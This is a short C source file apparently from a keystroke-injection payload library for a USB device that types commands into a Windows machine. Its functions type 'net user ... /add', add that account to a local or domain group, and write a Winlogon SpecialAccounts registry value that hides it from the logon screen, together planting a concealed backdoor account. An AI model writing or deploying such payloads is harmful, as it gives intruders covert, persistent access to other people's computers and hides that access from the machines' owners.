/*
 *  users.c
 *  
 *
 *  Created by Psychosis on 25/05/10.
 *  Copyright 2010 __MyCompanyName__. All rights reserved.
 *
 */

#include "psyduk/includes.h"
#include "payloads/includes.h"

void WAAddUser(const char* name, const char* password, uint8_t realm)
{
	PDTypeString_P("net user ");
	PDTypeString(name);
	PDTypeString_P(" ");
	PDTypeString(password);
	PDTypeString_P(" /add");
	
	if ( realm == REALM_DOMAIN )
	{
		PDTypeString_P(" /DOMAIN");
	}
	
	PDKeypress(KEY_ENTER);
}

void WAHideUserFromLogonScreen(const char* name)
{
	PDTypeString_P("REG ADD \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\" /V ");
	PDTypeString(name);
	PDTypeString_P(" /T REG_DWORD /F /D \"0\"\n");
}

void WAAddUserToGroup(const char* user, const char* group, uint8_t realm)
{
	PDTypeString_P("net localgroup \"");
	PDTypeString(group);
	PDTypeString_P("\" ");
	PDTypeString(user);
	PDTypeString_P(" /ADD");
	
	if ( realm == REALM_DOMAIN )
	{
		PDTypeString_P(" /DOMAIN");
	}
	
	PDKeypress(KEY_ENTER);
}